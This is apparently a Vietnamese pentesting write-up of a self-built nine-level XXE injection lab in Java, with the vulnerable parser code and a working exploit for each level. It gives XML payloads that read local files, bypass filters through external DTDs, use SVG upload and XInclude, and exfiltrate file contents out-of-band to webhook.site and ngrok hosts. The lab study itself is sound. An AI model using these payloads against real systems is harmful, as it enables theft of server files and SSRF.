---
title: XXE Injection Vulnerability Lab
categories: [pentesting, Web-Exploitation]
tags: [Web]
---

# XXE Injection Vulnerability Lab

### XXE Injection là gì?

XXE (XML External Entity) Injection là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào quá trình một ứng dụng xử lý dữ liệu XML. Lỗ hổng này xảy ra khi một trình phân tích (parser) XML được cấu hình yếu xử lý các thực thể bên ngoài (external entities) do người dùng cung cấp trong tài liệu XML.

Khai thác thành công lỗ hổng XXE có thể dẫn đến nhiều hậu quả nghiêm trọng, bao gồm:

- **Đọc file tùy ý:** Kẻ tấn công có thể đọc các file nhạy cảm trên hệ thống file của máy chủ, chẳng hạn như file cấu hình, mã nguồn, hoặc các file chứa thông tin người dùng (`/etc/passwd`).
- **Giả mạo yêu cầu phía máy chủ (SSRF - Server-Side Request Forgery):** Buộc ứng dụng phải thực hiện các yêu cầu đến các hệ thống khác mà nó có thể truy cập, kể cả các hệ thống trong mạng nội bộ.
- **Tấn công từ chối dịch vụ (DoS - Denial of Service):** Gây cạn kiệt tài nguyên của máy chủ, làm cho ứng dụng ngừng hoạt động (ví dụ: tấn công "Billion Laughs").
- **Thực thi mã từ xa (RCE - Remote Code Execution):** Trong một số trường hợp hiếm hoi, XXE có thể dẫn đến việc thực thi mã lệnh từ xa trên máy chủ.

### Overview

![image](https://hackmd.io/_uploads/rkUHHmE3le.png)

Với XXE thì mình tạo thẳng một giao diện để gửi thẳng payload vào và server sẽ trả thẳng kết quả của payload về vì ở đây với XXE theo các bài mình đã làm thì hầu như API nó đều hiện rõ phần nơi để mình inject nên mình sẽ là một api thẳng như này luôn.

Chỉ có khác ở level 7 ta sẽ làm chức năng upload file để có thể XXE bằng SVG qua File Upload.

Lab này xử lý logic chính ở file `XmlParserService.java` với 7 levels với 7 độ khó tăng dần với các lớp filter khác nhau.

### Source Code

[GitHub](https://github.com/pzhat/XXE_Injection_lab)

### Khai thác từng level và POC
#### Level 1:

```java 
   public String parseLevel1(String xml) {
        try {
            Document doc = createVulnerableBuilder().parse(new InputSource(new StringReader(xml)));
            return "Parsed XML content: " + doc.getDocumentElement().getTextContent();
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }
```

Ở level đầu tiên này nó sẽ chỉ là chức năng parser XML và return kết quả về với level này ta thấy sẽ không hề có lớp filter nào cả.

Ta sẽ test thử payload:

```xml 
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<data>&xxe;</data>
```

`<?xml version="1.0"?>`: Khai báo phiên bản XML.

`<!DOCTYPE data [...]>`: Khai báo DTD (Document Type Definition), cho phép định nghĩa các thực thể (entities).

`<!ENTITY xxe SYSTEM "file:///...">`: Định nghĩa một thực thể bên ngoài (external entity) tên là xxe, trỏ đến file hệ thống hosts trên Windows.

`<data>&xxe;</data>`: Gọi thực thể xxe, khiến trình phân tích XML cố gắng đọc nội dung file hosts và chèn vào vị trí này.

![image](https://hackmd.io/_uploads/B1xy36mNngx.png)

Thành công đọc được file `hosts` bằng cách gọi System với file protocol.

#### Level 2:

```java 
 public String parseLevel2(String xml) {
        if (xml.toLowerCase().contains("system") || xml.toLowerCase().contains("file://")) {
            return "Malicious input detected by filter!";
        }
        return parseLevel1(xml);
    }
```

Đến với level 2 có thể thấy bây giờ đã có lớp filter `file` protocol lại cùng với đó ta cũng sẽ không thể gọi `system` được nữa nếu trong câu XML có 2 cái trên sẽ bị trả về `Malicious input detected by filter!`.

Ở đây thì payload level 1 đã không còn tác dụng nữa nên ta sẽ tìm hướng đi khác.

Sau khi tìm hiểu thì ta hoàn toàn có thể sử dụng cách tạo `external dtd` để bypass được lớp filter kia.

![image](https://hackmd.io/_uploads/H1tX5EUhll.png)

Tạo file `evil_v2.dtd` với nội dung:

```xml 
<!ENTITY x SYSTEM "file:///C:/Windows/win.ini">
```

![image](https://hackmd.io/_uploads/Bk9U9ELnll.png)

Tiến hành host nó lên localhost với port là 8000.

Sau đó ta tiến hành truyền payload vào:

```xml 
<!DOCTYPE foo PUBLIC "X" "http://localhost:8000/evil_v2.dtd">
<foo>&x;</foo>
```

Ở đây ta dùng `PUBLIC` cùng với đó là biến `X` khi truyền vào nó sẽ gọi file trong localhost mà mình đã tạo sẵn payload và truyền xml vào.

![image](https://hackmd.io/_uploads/BJ0Qs4L3xx.png)

Thành công khai thác ở level này.

#### Level 3:

```java 
public String parseLevel3(String xml) {
        if (xml.toLowerCase().contains("<!doctype")) {
            return "Malicious DTD detected by filter!";
        }
        return parseLevel1(xml);
    }
```

Ở level 3 này có thể thấy cụm `<!doctype` đã bị filter lại làm cho việc khai thác trở nên không thể.

Level 3 hiện TẮT khả năng XXE chỉ bằng một filter duy nhất vào chuỗi “<!doctype”. Chuẩn XML không cho viết DOCTYPE “biến tấu” hợp lệ mà không chứa chuỗi này → Không có DTD → Không khai báo entity → Không XXE đọc file. Không có cơ chế phụ nào (XInclude/schema/XSLT) để pivot. => Không còn vector XXE thực tế nào.

Nên đây là một level gọi là secure vì không có doctype thì hầu như không payload nào XXE còn hoạt động được nữa.

#### Level 4:

```java 
public String parseLevel4(String xml) {
        try {
            Document doc = createSecureBuilder().parse(new InputSource(new StringReader(xml)));
            return "Parsed XML content (securely): " + doc.getDocumentElement().getTextContent();
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }
```

Ở đây ta gọi đến hàm `createSecureBuilder()`:

```java 
    private DocumentBuilder createSecureBuilder() throws ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        dbf.setXIncludeAware(false);
        dbf.setExpandEntityReferences(false);
        return dbf.newDocumentBuilder();
    }
```

Nó đã sử dụng bật tắt các feature để cấm XXE như là : 

- http://apache.org/xml/features/disallow-doctype-decl 
- http://xml.org/sax/features/external-general-entities 
- http://xml.org/sax/features/external-parameter-entities 
- setXIncludeAware(false)
- setExpandEntityReferences(false)
- newDocumentBuilder()

Từ đó thành công ngăn chặn đi các payload XXE được inject vào nên dù test với payload nào cũng sẽ bị chặn lại.

**Level 4 secure vì:**

Loại bỏ DOCTYPE (gốc của XXE entity)
Vô hiệu hóa external entities (kể cả nếu ai đó bật lại DOCTYPE)
Tắt XInclude
Không mở kênh schema / stylesheet → Tất cả vector XXE phổ biến bị triệt.

#### Level 5: 

```java 
public String parseLevel5(String xml) {
        try {
            // Vulnerable parser, but the response doesn't show the content
            createVulnerableBuilder().parse(new InputSource(new StringReader(xml)));
            return "Data processed successfully."; // No content is returned
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
```

Ở đây theo phân tích code thì ta thấy rằng:

- Dùng parser “vulnerable” (DocumentBuilder mặc định) → CHO PHÉP DOCTYPE + external entity.
- KHÔNG in ra nội dung XML.

Vì không trả về nội dung XML nên ta có thể suy đoán tình huống này là Blind XXE với tình huống này ta sẽ nghĩ cách để đưa được output ra ngoài hoặc ta sẽ làm nó tạo ra lỗi và vô tình in ra kết quả (Error Based).

Ta sẽ sử dụng webhook để tiến hành tấn công thử.

![image](https://hackmd.io/_uploads/HJYKx1vnle.png)

Tạo một url mới của webhook có chứa nội dung xml payload:

```xml 
<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///%file;'>">
%eval;
%error;
```

Sau đó đưa payload khác gọi đến webhook với mong muốn là nó sẽ nổ lỗi kèm theo đó là kết quả hoặc là kết quả sẽ được trả về trong response:

```xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY % remote SYSTEM "https://webhook.site/89cc7c4f-6ced-454a-9261-80bcea95157e">
    %remote;
]>
<root/>
```

![image](https://hackmd.io/_uploads/HyjjW1wnlg.png)

![image](https://hackmd.io/_uploads/By5abkPhll.png)

Thành công tạo ra lỗi kèm theo đó nó trả về dữ liệu ở đây là trường hợp Error Based.

#### Level 6:

```java 
   public String parseLevel6(String xml) {
        // This level has a specific configuration that reveals errors
        try {
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            // It allows external DTDs but might have issues resolving them, leading to errors
            dbf.setFeature("http://xml.org/sax/features/external-general-entities", true);
            DocumentBuilder dBuilder = dbf.newDocumentBuilder();
            dBuilder.parse(new InputSource(new StringReader(xml)));
            return "Data processed.";
        } catch (Exception e) {
            // The error message itself is the vulnerability
            return "An exception occurred: " + e.toString();
        }
    }
```

Ta để ý rằng dòng `dbf.setFeature("http://xml.org/sax/features/external-general-entities", true` đã mở đường cho phép các lệnh như `SYSTEM` được chạy bình thường và điều này gây nên XXE injection. Nhưng ở đây nó có thay đổi ở đoạn trả về lỗi nó sẽ trả về thông điệp kèm theo lý do lỗi,

Tuy có thay đổi về code nhưng cách khai thác vẫn có lẽ sẽ không khác gì với level 6 vì ta vẫn có thể Error Based XXE được.

![image](https://hackmd.io/_uploads/ryPzNyv3ll.png)

Test lại với payload cũ thì phần error sẽ vẫn kèm theo nội dung của câu payload gắn trong webhook.

#### Level 7:

```java 
 public String parseSvg(String svgContent) {
        try {
            Document doc = createVulnerableBuilder().parse(new InputSource(new StringReader(svgContent)));
            // Simulate rendering the SVG, which might trigger the XXE
            return "SVG file processed. It contains " + doc.getElementsByTagName("*").getLength() + " elements.";
        } catch (Exception e) {
            return "Error processing SVG: " + e.getMessage();
        }
    }
```

- Vector Tấn Công: Không còn là một payload XML thô nữa. Lần này, server mong đợi nhận được nội dung của một file SVG (Scalable Vector Graphics). Điều may mắn là SVG về bản chất chính là một file XML. Điều này có nghĩa là chúng ta có thể nhúng payload DTD độc hại của mình vào bên trong một file SVG hợp lệ.
- Cửa Ngõ XXE: Hàm createVulnerableBuilder() vẫn còn đó, đảm bảo rằng nếu chúng ta đưa một DTD vào, nó sẽ được xử lý.

Với suy nghĩ của tôi chắc là nên tận dụng thử payload của level 6 với level này xem liệu nó sẽ trả về gì vì đây là chức năng upload file SVG.

Đầu tiên ta vẫn sẽ tạo url trong webhook với `application/xml` với nội dung là:

```xml 
<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///%file;'>">
%eval;
%error;
```

Sau đó thì tạo file `payload.svg` với nội dung:

```xml 
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
    <!ENTITY % remote SYSTEM "https://webhook.site/08d61cbd-3978-4049-8c79-387217b982f1">
    %remote;
]>
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
    <circle cx="100" cy="100" r="80" fill="red" />
</svg>
```

Sau đó ta sẽ tiến hành upload xem nội dung nó trả về sẽ là gì.

![image](https://hackmd.io/_uploads/SJhH_1v2gg.png)

Có vẻ payload đã thành công đưa ra kết quả.

#### Level 8:

Ở level này ta sẽ tìm ra được cách tấn công mới hơn.

```java 
  public String parseLevel8(String xml) {
        try {
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            // DTDs are disabled, but XInclude is enabled!
            dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            dbf.setXIncludeAware(true); // The vulnerability!
            dbf.setNamespaceAware(true); // Required for XInclude

            DocumentBuilder dBuilder = dbf.newDocumentBuilder();
            Document doc = dBuilder.parse(new InputSource(new StringReader(xml)));
            return "XInclude Parsed: " + doc.getDocumentElement().getTextContent();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
```

- `disallow-doctype-decl", true`: Dòng này vô hiệu hóa hoàn toàn <!DOCTYPE ...>. Tất cả các payload dựa trên DTD (<!ENTITY ...>) của chúng ta từ Level 1 đến 7 đều trở nên vô dụng. Server sẽ báo lỗi ngay nếu thấy DOCTYPE.
- `setXIncludeAware(true)`: Đây là lỗ hổng mới! XInclude (XML Inclusions) là một tính năng tiêu chuẩn của XML, cho phép một file XML nhúng (include) nội dung của một file khác vào bên trong nó. Khi bật tính năng này mà không có kiểm soát, nó sẽ hoạt động y hệt như XXE: đọc file cục bộ hoặc thực hiện request ra bên ngoài.
- `doc.getDocumentElement().getTextContent()`: Đây là kênh rò rỉ dữ liệu In-band! Server không chỉ xử lý file được include, mà còn lấy nội dung text của nó (getTextContent()) và trả về trực tiếp cho chúng ta. Đây là kịch bản khai thác dễ nhất, không cần dùng đến error-based hay out-of-band.

Kịch bản ở đây ta sẽ lợi dụng XML Inclusion để tiến hành tấn công khai thác thử level này.

Chúng ta sẽ tạo một payload XML đơn giản sử dụng cú pháp của XInclude để đọc file `win.ini`.

Cú pháp của XInclude gồm 2 phần:

- Khai báo namespace: xmlns:xi="http://www.w3.org/2001/XInclude"
Thẻ include: <xi:include href="URI_CẦN_ĐỌC" parse="text"/>
href: Đường dẫn đến file cần đọc.
- parse="text": Cực kỳ quan trọng. Nó bảo parser hãy coi nội dung file là văn bản thô, đừng cố phân tích nó như XML (vì win.ini không phải là XML).

Ta sẽ có 1 payload như này:

```xml 
<?xml version="1.0" encoding="UTF-8"?>
<data xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="file:///C:/Windows/win.ini" parse="text"/>
</data>
```

Tiến hành inject vào.

![image](https://hackmd.io/_uploads/HyAg9Jv2le.png)

Thành công khai thác level 8.

#### Level 9:

Đến với level 9 thì bây giờ sẽ là challenge thuần blind khi mà sau khi parse sẽ không trả về kết quả và sẽ không báo lỗi nữa.

```java 
 public String parseLevel9(String xml) {
        try {
            createVulnerableBuilder().parse(new InputSource(new StringReader(xml)));
            return "Request processed.";
        } catch (Exception e) {
            // Lỗi bị "nuốt", chỉ trả về thông báo chung chung
            return "Request processed.";
        }
    }
```

Nhưng ở đây sẽ vẫn tồn tại lỗ hổng tại vì vẫn sử dụng `createVulnerableBuilder()` nên hoàn toàn có thể tìm cách để thay vì đưa được output hiển thị ở lỗi như level 5,6 thì ta có thể thử sử dụng OOB (Out Of Band). Với mục đích đưa được output ra bên ngoài vì ở đây phần result không hiển thị rõ kết quả vè eror cũng bị chặn hết nên ta sẽ không thể error based nữa.

Sau khi tham khảo các nguồn thì tôi sẽ thử OOB trường hợp này mình sẽ gửi result ra bằng http liệu xem nó sẽ trả về cái gì.

![image](https://hackmd.io/_uploads/Sk-vgCo3xx.png)

Tiến hành host 1 python server đến port 8000 ở folder mà ta để payload.

![image](https://hackmd.io/_uploads/BkZqlConee.png)

Sử dụng ngrok để listen port 8000 và tạo tunnel đưa nó ra ngoài.

![image](https://hackmd.io/_uploads/Sk8TxAj3lx.png)

Tạo file exploit.dtd với nội dung trên:

```xml 
<!ENTITY % file SYSTEM "file:///C:/Windows/system.ini">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://eparchial-dahlia-edgier.ngrok-free.dev/?x=%file;'>">
%eval;
%exfiltrate;
```

![image](https://hackmd.io/_uploads/Sk3yG0i2gx.png)

Tiến hành payload cho ngrok trỏ đến file và khi nó get về nó sẽ thực thi file dtd và mong nó sẽ trả result trong request.

![image](https://hackmd.io/_uploads/rkx07fCo2lx.png)

Có vẻ như thành công GET file nhưng không hề có thông tin nào được trả về. Ở đây sau khi thử vài cách về đọc file nhưng không hề được thì mình đang nghĩ là do cấu hình Spring không cho phép thực thì dtd đọc file nên mình sẽ thử cách khác là SSRF bằng cách thử ping.

Vẫn như trên ta sẽ tạo python server sau đó đưa nó qua ngrok listen sau đó tạo file ping.dtd với nội dung:

```xml 
<!ENTITY % ping SYSTEM "https://eparchial-dahlia-edgier.ngrok-free.dev/ping-successful">
```

Payload này sẽ cố đọc ping.dtd, server lab hiểu lệnh bên trong (<!ENTITY % ping SYSTEM ".../ping-successful">) và đã thực thi nó. Nó sẽ gửi đi một request thứ hai đến địa chỉ /ping-successful.

![image](https://hackmd.io/_uploads/ryENSAj3gl.png)

Ta có kết quả sau khi tiến hành sử dụng payload:

```xml 
<?xml version="1.0" ?>
<!DOCTYPE data [
    <!ENTITY % oob SYSTEM "https://eparchial-dahlia-edgier.ngrok-free.dev/ping.dtd">
    %oob;

    %ping;
]>
<data>test</data>
```

**1. ::1 - - [02/Oct/2025 17:29:25] "GET /ping.dtd HTTP/1.1" 200 -**

- Ý nghĩa: Server lab đã kết nối đến server python và tải thành công file ping.dtd. Status 200 có nghĩa là "OK".

**2. ::1 - - [02/Oct/2025 17:29:25] "GET /ping-successful HTTP/1.1" 404 -**

- Ý nghĩa: Đây là dòng quan trọng nhất. Sau khi đọc ping.dtd, server lab đã hiểu lệnh bên trong (<!ENTITY % ping SYSTEM ".../ping-successful">) và đã thực thi nó. Nó đã gửi đi một request thứ hai đến địa chỉ /ping-successful.

Tại sao lại là 404? Vì trên server python không hề có file nào tên là ping-successful. Server python trả về lỗi "404 File Not Found" là hoàn toàn đúng.

- Kết luận: Thành công sử dụng XXE để thực thi Blind SSRF vì ta có thể thấy xml payload trong ping.dtd vẫn được thực thi và trỏ đến xem có file `/ping-successful` không và từ đó có thể thấy xml trong đoạn vẫn được thực thi nhưng ở đây có khả năng cao do cấu hình của Spring không còn cho phép thực thi các lệnh như `file` nên không đọc file được.

Bây giờ nếu windows không được ta sẽ chuyển sang thử môi trường linux để xem liệu có chạy được không.

![image](https://hackmd.io/_uploads/HJlA5Mhhgx.png)

Host python server lên.

![image](https://hackmd.io/_uploads/Bkhzof23xx.png)

Tạo file `exploit-linux.dtd` với nội dung:

```xml 
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://eparchial-dahlia-edgier.ngrok-free.dev/%file;'>">
%eval;
%exfiltrate;        
``

Payload này sẽ giúp ta đọc dữ liệu của file `/etc/hostname`.

Bây giờ ta sẽ bỏ payload vào trong level 9 để xem dữ liệu trả về ra sao.

```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
    <!ENTITY % oob SYSTEM "http://localhost:8000/exploit-linux.dtd">
    %oob;
]>
<data>go</data>
```

![image](https://hackmd.io/_uploads/HJwW6gp2xl.png)

![image](https://hackmd.io/_uploads/HyxM3z2ngl.png)

Thành công đọc được file hostname.

![image](https://hackmd.io/_uploads/r164hz33lx.png)

Từ đây tôi khá chắc là nếu file hostname thành công mà những file dài không có kết quả thì khả năng cao là nếu file quá dài và nhiều kí tự thì sẽ khó để mà đọc được nên khả năng nếu sử dung ftp protocol thì khả năng cao sẽ có thể đọc được những file dài.

